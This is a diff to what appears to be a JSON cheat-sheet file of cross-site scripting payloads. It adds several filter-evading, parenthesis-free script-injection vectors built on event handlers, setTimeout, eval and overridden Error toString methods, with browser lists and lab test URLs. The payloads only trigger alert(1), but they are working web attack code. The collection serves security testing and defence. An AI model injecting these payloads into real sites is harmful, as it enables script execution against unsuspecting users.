@@ -177,7 +177,7 @@
   },
   {
     "description": "window.name with onerror and throw on Firefox",
-    "code": "throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}",
+    "code": "<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>",
     "browsers": ["firefox"],
     "url": "https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ca+href=%23+onclick=%22window.open(%27https://portswigger-labs.net/xss/xss.php?x=%3Cscript%3Ethrow%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}%3C/script%3E%27,%27+alert(1)%27,%27width=500,height=500%27)%22%3Etest%3C/a%3E#"
   },
@@ -192,5 +192,76 @@
     "code": "<body onload=\"throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}\">",
     "browsers": ["firefox"],
     "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload=%22throw%20onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:%27/*%27%2blocation}%22%3E#*/alert(1)"
+  },
+  {
+    "description": "ondevicemotion and URIError object",
+    "code": "<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "ondeviceorientation and Error object",
+    "code": "<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "ondeviceorientationabsolute and WebTransportError object",
+    "code": "<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onpagereveal and AggregateError object",
+    "code": "<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onpageswap and EvalError object",
+    "code": "<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "edge"]
+  },
+  {
+    "description": "onmessage and RangeError object",
+    "code": "<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=\"alert\\x281\\x29\">';target.onload=setTimeout(function(){frames[0].postMessage(\"\", \"*\")},100)</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20id=target%3E%3C/iframe%3E%3Cscript%3Etarget.src=%27xss.php?x=%3Cimg/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=%22alert%5Cx281%5Cx29%22%3E%27;target.onload=setTimeout(function()%7Bframes%5B0%5D.postMessage(%22%22,%20%22*%22)%7D,100)%3C/script%3E"
+  },
+  {
+    "description": "onhashchange and Regex object",
+    "code": "<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\\x28alert\\x281\\x29\\x29';Event.prototype.toString=/x/.toString</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onscroll and ReferenceError object",
+    "code": "<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onscrollend and SyntaxError object",
+    "code": "<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\\x281\\x29'</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onselect and TypeError object",
+    "code": "<input value=x autofocus onfocus=\"window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "ontransitionstart / ontransitionend / ontransitionrun and Arrow function",
+    "code": "<img/src/style=transition:0.1s onerror=\"window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onload and DOMException object",
+    "code": "<img/src/onerror=\"window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\\x281\\x29'\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onpageshow and WebTransportError object",
+    "code": "<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "onerror and ReferenceError without throw",
+    "code": "<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   }
 ]
